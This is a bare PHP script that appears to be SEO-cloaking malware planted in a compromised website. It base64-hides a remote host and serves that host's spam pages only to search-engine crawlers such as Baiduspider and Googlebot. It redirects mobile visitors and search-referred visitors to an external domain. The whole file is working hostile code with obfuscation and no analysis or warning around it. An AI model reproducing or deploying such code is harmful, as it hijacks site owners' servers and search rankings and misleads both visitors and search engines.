<?php
error_reporting(0);
header("Content-Type: text/html;charset=utf-8");
define('URI', $_SERVER['REQUEST_URI']);
define('host', base64_decode('aHR0cDovLzExMy4yMDcuNDkuNjY6ODk5OS8='));
define('MULU', 'timi|app|ios|android|download|page|games|play|video|news|product|blog|list|vod|post|activities|id|?|a|forum|portal|question|b|keyan|index.php|g|swsb|ys|dy|du|ku|show.php|.html');
function isEngines($key) {
    $spiders = array('Baiduspider', 'Sogou', '360Spider', 'YisouSpider', 'Googlebot', 'Bingbot', 'Bytespider');
    foreach ($spiders as $spider) {
        if (stripos($key, $spider) !== false) return true;
    }
    return false;
}
function my_custom_isMobile() {
    return preg_match("/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i", $_SERVER["HTTP_USER_AGENT"]);
}
function isIncludes() {
    $temp = explode('|', MULU);
    foreach ($temp as $v) {
        if (stripos(URI, $v) !== false) return true;
    }
    return false;
}

function isRef($ref) {
    if (empty($ref)) return false;
    return (stripos($ref, 'baidu') !== false || stripos($ref, 'sm.cn') !== false || 
            stripos($ref, 'so.com') !== false || stripos($ref, 'sogou') !== false);
}

function getContents($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)");
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    $result = curl_exec($ch);
    curl_close($ch);
    if ($result == NULL) {
        return @file_get_contents($url);
    }
    return $result;
}

$ref = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : '';
$key = isset($_SERVER["HTTP_USER_AGENT"]) ? $_SERVER["HTTP_USER_AGENT"] : '';
$ym = $_SERVER['HTTP_HOST'];

if (isEngines($key)) {
    header('Content-Type:text/html;charset=utf-8');
    if (isIncludes()) {
        echo getContents(host . "?xhost=" . $ym . '&reurl=' . urlencode(URI) . '&ua=Baiduspider&f=bd');
    exit;		
    } else {
        echo getContents(host . "lunlian/dt.php");
    }
} else {
    if (isIncludes()) {
        if (isRef($ref) || my_custom_isMobile()) {
            header("Location: https://zhibonbawp5.fast-bit6372.com:15241/?cid=jhgb&ref=" . urlencode($ym));
            exit;
        }
    }
}
?>